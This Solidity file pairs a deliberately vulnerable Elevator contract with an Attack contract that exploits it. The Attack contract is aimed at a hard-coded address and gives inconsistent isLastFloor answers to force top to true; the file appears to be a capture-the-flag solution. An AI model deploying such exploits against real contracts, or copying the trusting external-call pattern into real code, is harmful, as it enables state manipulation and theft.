// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Attack {
    Elevator elevator = Elevator(0x3dF9535976Cd87d4D70d263C4f574aE4CE1B58A1);
    uint private count;

    function attack() public {
        elevator.goTo(1);
    }

    function isLastFloor(uint) public returns (bool) {
        count++;
        return count > 1;
    }
}
